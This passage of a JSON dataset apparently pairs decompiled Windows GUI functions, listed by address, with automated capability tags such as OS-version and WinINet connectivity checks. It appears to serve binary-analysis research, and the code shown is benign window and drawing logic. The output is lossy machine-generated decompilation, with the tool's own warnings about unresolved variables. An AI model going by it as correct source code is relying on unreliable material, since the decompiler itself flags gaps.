fcn.00431c34(uVar1, uVar2, uVar4, uVar5);\n    }\n    uVar5 = 0;\n    uVar2 = fcn.004241dc();\n    uVar4 = *(*(*piVar3 + 0x18) * 0x14 + 0x493548);\n    uVar1 = fcn.00458594();\n    fcn.00431c34(uVar1, uVar4, uVar2, uVar5);\n    return;\n}\n",
        "token_count": 589
    },
    "0043c840": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0043c840(uint param_1, uchar param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint var_22h;\n    uint var_1eh;\n    uint var_1ah;\n    uint var_16h;\n    int32_t var_12h;\n    uint var_eh;\n    uint var_ah;\n    int32_t var_6h;\n    \n    *(in_EAX + 0x14) = 0;\n    cVar1 = *(in_EAX + 0x18);\n    var_6h._1_1_ = param_2;\n    unique0x100000a4 = in_EAX;\n    if (*(in_EAX + 0x1c) != '\\0') {\n        iVar2 = fcn.0043c148();\n        iVar2 = *(stack0xfffffff8 + 0x10) - iVar2;\n        *(stack0xfffffff8 + 0x14) = iVar2;\n        if (iVar2 < 0) {\n            *(stack0xfffffff8 + 0x14) = 0;\n        }\n    }\n    var_22h = 0x1c;\n    var_1eh = 0x17;\n    var_1ah = 0;\n    if (*(stack0xfffffff8 + 0x14) < 1) {\n        var_16h = 0;\n    }\n    else {\n        var_16h = *(stack0xfffffff8 + 0x10);\n    }\n    var_12h = fcn.0043c148();\n    var_12h = var_12h + 1;\n    var_eh = *(stack0xfffffff8 + 0xc);\n    var_ah = var_eh;\n    fcn.0043c738(&stack0xfffffffc);\n    *(stack0xfffffff8 + 0x44) = 0;\n    uVar3 = fcn.00458594(cVar1 == '\\x01', &var_22h, 0xffffffff);\n    (***0x495ce8)(uVar3);\n    fcn.0043c5b8();\n    iVar2 = fcn.0043c148();\n    uVar4 = (iVar2 * 9) / 10;\n    *(stack0xfffffff8 + 10) = uVar4;\n    if (*(stack0xfffffff8 + 0x1f) != '\\0') {\n        *(stack0xfffffff8 + 8) = (uVar4 & 0xffff) / 10;\n    }\n    return;\n}\n",
        "token_count": 599
    },
    "0043ca20": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043ca20(void)\n\n{\n    char cVar1;\n    uint arg_8h;\n    \n    fcn.004548d0();\n    if (*(*0x495d2c + 0xd) == '\\0') {\n        cVar1 = fcn.0040e38c();\n        if (cVar1 == '\\0') {\n            arg_8h = fcn.00458594();\n            fcn.00431c68(arg_8h);\n        }\n    }\n    fcn.0043cc38();\n    return;\n}\n",
        "token_count": 123
    },
    "0043caa0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043caa0(void)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = fcn.00404620();\n    arg_8h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    iVar4 = fcn.004501ac();\n    iVar5 = *(in_EAX + 0x250);\n    cVar2 = fcn.0043c060();\n    if ((cVar2 == '\\0') || (*(iVar5 + 0x10) <= iVar4)) {\n        bVar1 = false;\n    }\n    else {\n        bVar1 = true;\n    }\n    if (bVar1) {\n        fcn.0043c5b8();\n    }\n    iVar5 = fcn.00454684();\n    if (-1 < iVar5 + -1) {\n        do {\n            fcn.00454648();\n            fcn.00454648();\n            fcn.0041975c();\n            fcn.0044fec0();\n            iVar5 = iVar5 + -1;\n        } while (iVar5 != 0);\n    }\n    iVar5 = *(iVar3 + 8);\n    if (-1 < iVar5 + -1) {\n        do {\n            arg_8h = 0;\n            fcn.004198b4();\n            fcn.00451ae8(arg_8h);\n            iVar5 = iVar5 + -1;\n        } while (iVar5 != 0);\n    }\n    if (bVar1) {\n        fcn.0043bea0();\n    }\n    *in_FS_OFFSET = arg_8h;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 433
    },
    "0043cbb8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043cbb8(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x25c) < 1) {\n        fcn.0043bfb4();\n        fcn.0043bfb4();\n    }\n    return;\n}\n",
        "token_count": 66
    },
    "0043cc38": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043cc38(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack20;\n    uint uStack16;\n    uchar *puStack12;\n    int32_t var_4h;\n    \n    if (*(in_EAX + 0x260) == '\\0') {\n        puStack12 = 0x43cc57;\n        var_4h = in_EAX;\n        cVar1 = fcn.004588a0();\n        if (cVar1 != '\\0') {\n            uStack16 = 0x43cd23;\n            uStack20 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffec;\n            *(var_4h + 0x260) = 1;\n            puStack12 = &stack0xfffffffc;\n            cVar1 = fcn.0043c1c8();\n            if (cVar1 == '\\0') {\n                cVar1 = fcn.0043c1c8();\n                if (cVar1 == '\\0') {\n                    fcn.0043c840();\n                    fcn.0043c840();\n                }\n                else {\n                    fcn.0043c840();\n                    fcn.0043c840();\n                }\n            }\n            else {\n                fcn.0043c840();\n                fcn.0043c840();\n            }\n            *in_FS_OFFSET = uStack20;\n            *(var_4h + 0x260) = 0;\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 343
    },
    "0043d374": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.0043d374(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    uVar1 = fcn.00402ee8();\n    *(in_EAX + 0x2a4) = uVar1;\n    fcn.0043c95c();\n    *(in_EAX + 0x50) = *0x43d538;\n    fcn.0044354c();\n    fcn.00443588();\n    fcn.0044ff28();\n    fcn.0044ff5c();\n    piVar2 = fcn.0042ae74();\n    *(in_EAX + 0x288) = piVar2;\n    (***0x495974)(0x31);\n    (**(*piVar2 + 0x40))();\n    (***0x495974)();\n    (**(**(in_EAX + 0x288) + 0x34))();\n    iVar3 = *(in_EAX + 0x288);\n    *(iVar3 + 0x14) = in_EAX;\n    *(iVar3 + 0x10) = fcn.0043e024;\n    *(in_EAX + 0x278) = 2;\n    uVar1 = fcn.004250b4();\n    *(in_EAX + 0x280) = uVar1;\n    fcn.0044f0dc();\n    *(in_EAX + 0x270) = *0x43d53c;\n    *(in_EAX + 0x271) = 2;\n    *(in_EAX + 0x273) = 0;\n    *(in_EAX + 0x279) = 3;\n    *(in_EAX + 0x28c) = 0;\n    **(in_EAX + 0x2a4) = *(*0x49ac20 + 0x40);\n    uVar1 = fcn.00448004();\n    *(*(in_EAX + 0x2a4) + 4) = uVar1;\n    iVar3 = fcn.00447dd8();\n    *(iVar3 + 0x24) = in_EAX;\n    *(iVar3 + 0x20) = fcn.00447e8c;\n    *(*(in_EAX + 0x2a4) + 8) = 0;\n    *(in_EAX + 0x27d) = 1;\n    uVar1 = fcn.00404528();\n    *(in_EAX + 0xac) = uVar1;\n    *(in_EAX + 0x329) = 0xff;\n    *(in_EAX + 0x354) = 0;\n    fcn.0043e3a8();\n    fcn.004509f8();\n    fcn.0045095c();\n    fcn.00458780();\n    fcn.00443e10();\n    *(in_EAX + 0x34c) = 10;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = 0x32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 792
    },
    "0043d5a8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0043d5a8(void)\n\n{\n    char cVar1;\n    uchar extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    int32_t *var_5h;\n    \n    puStack16 = 0x43d5b3;\n    *NULL = fcn.00404a1c();\n    puStack16 = 0x43d5c6;\n    var_5h._0_1_ = extraout_DL;\n    fcn.004453dc();\n    if ((*(stack0xfffffff8 + 7) & 8) == 0) {\n        puStack16 = 0x43d5db;\n        (**(***0x495cec + 0x14))();\n    }\n    uStack20 = 0x43d6a8;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    if (*(stack0xfffffff8 + 0x9f) != '\\0') {\n        puStack16 = &stack0xfffffffc;\n        (**(*stack0xfffffff8 + 0xe8))();\n    }\n    fcn.00440f6c();\n    cVar1 = fcn.004588a0();\n    if (cVar1 != '\\0') {\n        (**(*stack0xfffffff8 + 0xb4))();\n    }\n    fcn.00443e48();\n    fcn.00404650();\n    fcn.00404650();\n    fcn.0040f94c();\n    fcn.0040f94c();\n    fcn.00447dd8();\n    fcn.00404650();\n    fcn.00402f1c();\n    fcn.0043c9d4();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x43d6af;\n    uStack20 = 0x43d6a7;\n    (**(***0x495cec + 0x18))();\n    return;\n}\n",
        "token_count": 475
    },
    "0043d6c4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043d6c4(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    if (*(in_EAX + 0x31a) != 0) {\n        uStack28 = 0x43d705;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        (**(in_EAX + 0x318))();\n        *in_FS_OFFSET = uStack32;\n    }\n    if ((*(in_EAX + 0x358) & 2) != 0) {\n        puStack24 = 0x43d73a;\n        fcn.0043e3a8();\n    }\n    return;\n}\n",
        "token_count": 197
    },
    "0043d740": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043d740(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    if (*(in_EAX + 0x322) != 0) {\n        uStack28 = 0x43d781;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &uStack32;\n        (**(in_EAX + 800))();\n        *in_FS_OFFSET = uStack32;\n    }\n    return;\n}\n",
        "token_count": 142
    },
    "0043d7a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043d7a0(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    fcn.00452f54();\n    if ((*(in_EAX + 0x268) != 0) && ((*(in_EAX + 0x30) == 0 || ((*(in_EAX + 0x1c) & 0x10) == 0)))) {\n        *(in_EAX + 0x268) = 0;\n        cVar1 = fcn.0040484c();\n        if (cVar1 != '\\0') {\n            fcn.00440a6c();\n        }\n    }\n    fcn.00447dd8();\n    cVar1 = fcn.004480c4();\n    if (cVar1 != '\\0') {\n        fcn.00447e8c();\n    }\n    return;\n}\n",
        "token_count": 196
    },
    "0043d940": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043d940(void)\n\n{\n    bool bVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x43d953;\n    fcn.004541a0();\n    uStack24 = 0x43dbbd;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    *(in_EAX + 0x2b0) = 0;\n    *(in_EAX + 0x2b4) = 0;\n    *(in_EAX + 0x2b8) = 0;\n    bVar1 = false;\n    puStack20 = &stack0xfffffffc;\n    iVar2 = fcn.004045dc();\n    if (iVar2 == *0x43a284) {\n        *(in_EAX + 0x27c) = *0x4987f5 ^ 1;\n    }\n    fcn.004537c8();\n    if ((**(in_EAX + 0x2a4) != 0) && (0 < *(in_EAX + 0x2b8))) {\n        if (((*(in_EAX + 0x8c) & 0x10) != 0) && (**(in_EAX + 0x2a4) != *(*0x49ac20 + 0x40))) {\n            uVar3 = fcn.00424948(*(*0x49ac20 + 0x40), **(in_EAX + 0x2a4));\n            sub.kernel32.dll_MulDiv(uVar3);\n            fcn.00424950();\n        }\n        **(in_EAX + 0x2a4) = *(*0x49ac20 + 0x40);\n        iVar2 = fcn.0043df74();\n        if (iVar2 != *(in_EAX + 0x2b8)) {\n            bVar1 = true;\n            fcn.0043ce9c();\n            fcn.004502ec();\n            fcn.0045804c();\n            if ((*(in_EAX + 0x8c) & 4) != 0) {\n                uVar3 = sub.kernel32.dll_MulDiv(*(in_EAX + 0x2b0), iVar2, *(in_EAX + 0x2b8));\n                *(in_EAX + 0x2b0) = uVar3;\n            }\n            if ((*(in_EAX + 0x8c) & 8) != 0) {\n                uVar3 = sub.kernel32.dll_MulDiv();\n                *(in_EAX + 0x2b4) = uVar3;\n            }\n            if ((*(in_EAX + 0x8c) & 0x20) != 0) {\n                uVar3 = sub.kernel32.dll_MulDiv(*(in_EAX + 0x242), iVar2, *(in_EAX + 0x2b8));\n                *(in_EAX + 0x242) = uVar3;\n                uVar3 = sub.kernel32.dll_MulDiv();\n                *(in_EAX + 0x246) = uVar3;\n            }\n        }\n    }\n    if (0 < *(in_EAX + 0x2b0)) {\n        fcn.004501c4();\n    }\n    if (0 < *(in_EAX + 0x2b4)) {\n        fcn.00450208();\n    }\n    *(in_EAX + 0x8c) = *0x43dbcc;\n    if (!bVar1) {\n        fcn.0043ce9c();\n        fcn.0045804c();\n    }\n    uVar3 = 0;\n    fcn.00451ae8(0);\n    *in_FS_OFFSET = uVar3;\n    fcn.004541a8(0x43dbc4);\n    return;\n}\n",
        "token_count": 902
    },
    "0043dbd0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0043dbd0(uint arg_8h)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    \n    // switch table (6 cases) at 0x43dbe6\n    switch(in_EAX & 0x7f) {\n    case 0:\n        uVar1 = fcn.00447dd8();\n        return uVar1 & 0xffffff00 | *(uVar1 + 0xc) != 0;\n    case 1:\n        uVar1 = fcn.00447dd8();\n        return uVar1 & 0xffffff00 | *(uVar1 + 0x10) != 0;\n    case 2:\n        uVar1 = fcn.00447dd8();\n        return uVar1 & 0xffffff00 | *(uVar1 + 0x14) != 0;\n    case 3:\n        uVar1 = fcn.00447dd8();\n        return uVar1 & 0xffffff00 | *(uVar1 + 0x18) != 0;\n    case 4:\n        iVar2 = fcn.00447dd8();\n        return *(iVar2 + 8);\n    case 5:\n        iVar2 = fcn.00447dd8();\n        return *(iVar2 + 0x28);\n    default:\n        return 0;\n    }\n}\n",
        "token_count": 310
    },
    "0043df38": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0043df38(void)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 0x1c) & 0x10) != 0) && (*(in_EAX + 0x30) != 0)) {\n        return *(in_EAX + 0x18) >> 0x10;\n    }\n    return *(in_EAX + 0x40);\n}\n",
        "token_count": 96
    },
    "0043df58": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0043df58(void)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 0x1c) & 0x10) != 0) && (*(in_EAX + 0x30) != 0)) {\n        return *(in_EAX + 0x18);\n    }\n    return *(in_EAX + 0x44);\n}\n",
        "token_count": 90
    },
    "0043e024": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043e024(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if (**0x495a14 == '\\0') {\n        fcn.00458594();\n        iVar3 = fcn.0043b6f8();\n        if (iVar3 != 0) {\n            (**(*in_EAX + 0x80))();\n        }\n    }\n    else {\n        cVar1 = fcn.004588a0();\n        if ((cVar1 != '\\0') && (*(in_EAX + 0x271) != '\\x03')) {\n            uVar2 = fcn.004410e0();\n            uVar2 = fcn.00458594(0x80, 1, uVar2);\n            sub.user32.dll_SendMessageA(uVar2);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 205
    },
    "0043e090": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0043e090(void)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 600) == '\\0') && (*(*(in_EAX + 0x250) + 0x10) == 0)) && (*(*(in_EAX + 0x254) + 0x10) == 0)) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 94
    },
    "0043e3ec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043e3ec(void)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x43e4d2;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puVar1 = &stack0xfffffffc;\n    if (((*(in_EAX + 0x277) == '\\x01') && (puVar1 = &stack0xfffffffc,  *(in_EAX + 0x57) != '\\0')) &&\n       (puVar1 = &stack0xfffffffc,  *(in_EAX + 0x30) == 0)) {\n        fcn.00407550();\n        fcn.0040db04();\n        fcn.00404ec4();\n        puVar1 = puStack16;\n    }\n    puStack16 = puVar1;\n    if ((in_EAX == *(*0x49ac1c + 0x44)) && ((*(in_EAX + 0x1c) & 8) == 0)) {\n        if (*(in_EAX + 0x57) == '\\0') {\n            fcn.004481b8();\n            fcn.0043b774();\n            uVar3 = fcn.004481b8();\n            fcn.00458594(uVar3);\n            fcn.0043b774();\n        }\n        else {\n            uVar2 = fcn.004481b8();\n            fcn.00458594(uVar2 ^ 1);\n            fcn.0043b774();\n            fcn.0043b774();\n        }\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x43e4d9;\n    uStack20 = 0x43e4d1;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 469
    },
    "0043e4e4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043e4e4(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    bool bVar1;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    if ((param_2 != in_EAX[0xc]) && (param_2 != in_EAX)) {\n        bVar1 = in_EAX[0xc] == NULL;\n        if (bVar1) {\n            puStack20 = 0x43e51d;\n            fcn.00459934();\n        }\n        uStack24 = 0x43e594;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        puStack20 = &stack0xfffffffc;\n        if (bVar1) {\n            puStack20 = &stack0xfffffffc;\n            (**(*in_EAX + 0xb0))();\n        }\n        if ((*(in_EAX + 7) & 0x10) == 0) {\n            in_EAX[0x9a] = 0;\n        }\n        in_EAX[0x9b] = 0;\n        fcn.004599fc();\n        if (in_EAX[0xc] == 0) {\n            fcn.00455154();\n        }\n        *in_FS_OFFSET = uStack28;\n        puStack20 = 0x43e59b;\n        if (bVar1) {\n            uStack24 = 0x43e593;\n            fcn.00459934();\n        }\n        return;\n    }\n    return;\n}\n",
        "token_count": 374
    },
    "0043e5a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043e5a0(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    fcn.004203f8(arg_8h);\n    if (*(in_EAX + 0x298) != 0) {\n        (**(**(in_EAX + 0x298) + 0x30))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 89
    },
    "0043e5e0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043e5e0(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar6 = *param_2;\n    if (iVar6 < 0x113) {\n        if (iVar6 == 0x112) {\n            if ((((param_2[1] & 0xfff0U) == 0xf120) && (*(*0x49ac1c + 0x44) == in_EAX)) &&\n               (cVar1 = fcn.004481b8(),  cVar1 != '\\0')) {\n                fcn.004481c0();\n            }\n            goto code_r0x0043eb0c;\n        }\n        if (iVar6 - 6U < 3) {\n            if (*0x493508 == '\\0') {\n                return;\n            }\n            if ((*param_2 == 7) && ((*(in_EAX + 7) & 0x10) == 0)) {\n                iVar6 = 0;\n                if (*(in_EAX + 0x277) == '\\x02') {\n                    iVar2 = fcn.0043f490();\n                    if (iVar2 != 0) {\n                        fcn.0043f490();\n                        iVar6 = fcn.00458594();\n                    }\n                }\n                else if ((in_EAX[0x9a] != NULL) && (in_EAX[0x9a] != in_EAX)) {\n                    iVar6 = fcn.00458594();\n                }\n                if (iVar6 != 0) {\n                    sub.user32.dll_SetFocus();\n                    return;\n                }\n            }\n            goto code_r0x0043eb0c;\n        }\n        if (iVar6 == 0x2b) {\n            piVar3 = param_2[2];\n            if (((*piVar3 == 1) && (in_EAX[0xa4] != 0)) && (iVar6 = fcn.004379c0(),  iVar6 != 0)) {\n                fcn.004250b4();\n                *in_FS_OFFSET = &stack0xffffffd0;\n                sub.gdi32.dll_SaveDC();\n                *in_FS_OFFSET = &stack0xffffffc0;\n                fcn.00425748();\n                fcn.004255dc();\n                piVar3 = *(piVar3 + 4);\n                puStack72 = 0x43e918;\n                fcn.00439148(piVar3);\n                *in_FS_OFFSET = piVar3;\n                fcn.00425748();\n                puStack72 = 0x43e93f;\n                sub.gdi32.dll_RestoreDC();\n                return;\n            }\n            goto code_r0x0043eb0c;\n        }\n        if (iVar6 == 0x2c) {\n            piVar3 = param_2[2];\n            if (((*piVar3 == 1) && (in_EAX[0xa4] != 0)) && (piVar4 = fcn.004379c0(),  piVar4 != NULL)) {\n                fcn.00458594();\n                uVar5 = sub.user32.dll_GetWindowDC();\n                *in_FS_OFFSET = &stack0xffffffcc;\n                fcn.004250b4();\n                *in_FS_OFFSET = &stack0xffffffc0;\n                puStack72 = 0x43e9e2;\n                iVar6 = sub.gdi32.dll_SaveDC();\n                uStack76 = 0x43ea47;\n                piStack80 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffb0;\n                puStack72 = &stack0xfffffffc;\n                fcn.00425748();\n                fcn.004255dc();\n                piVar3 = piVar3 + 4;\n                (**(*piVar4 + 0x38))();\n                *in_FS_OFFSET = piVar3;\n                uStack76 = 0x43ea4e;\n                piStack80 = 0x43ea39;\n                fcn.00425748();\n                piStack80 = iVar6;\n                sub.gdi32.dll_RestoreDC(uVar5);\n                return;\n            }\n            goto code_r0x0043eb0c;\n        }\n        if (iVar6 == 0x46) {\n            if (*0x43eb24 == (*(in_EAX + 7) & *0x43eb20)) {\n                if ((*(in_EAX + 0x9e) - 1U < 2) && (*(in_EAX + 0x273) != '\\x02')) {\n                    *(param_2[2] + 0x18) = *(param_2[2] + 0x18) | 2;\n                }\n                if (((*(in_EAX + 0x9e) == '\\x01') || (*(in_EAX + 0x9e) == '\\x03')) &&\n                   ((*(in_EAX + 0x271) == '\\x02' || (*(in_EAX + 0x271) == '\\x05')))) {\n                    *(param_2[2] + 0x18) = *(param_2[2] + 0x18) | 1;\n                }\n            }\n            goto code_r0x0043eb0c;\n        }\n    }\n    else {\n        if (iVar6 - 0x31eU < 2) {\n            fcn.00447e8c();\n            goto code_r0x0043eb0c;\n        }\n        if (iVar6 == 0xb01a) {\n            if (in_EAX[0x25] != 0) {\n                fcn.0040484c();\n            }\n            goto code_r0x0043eb0c;\n        }\n        if (iVar6 == 0xb01b) {\n            if (in_EAX[0x25] != 0) {\n                fcn.0040484c();\n            }\n            goto code_r0x0043eb0c;\n        }\n        if (iVar6 == 0xb047) {\n            iVar6 = param_2[1];\n            iVar2 = 0;\n            while ((iVar6 != 0 && (iVar2 == 0))) {\n                iVar2 = fcn.0044d290();\n                iVar6 = sub.user32.dll_GetParent();\n            }\n            if ((iVar2 != 0) &&\n               ((((piVar3 = fcn.0043bd2c(),  iVar2 != 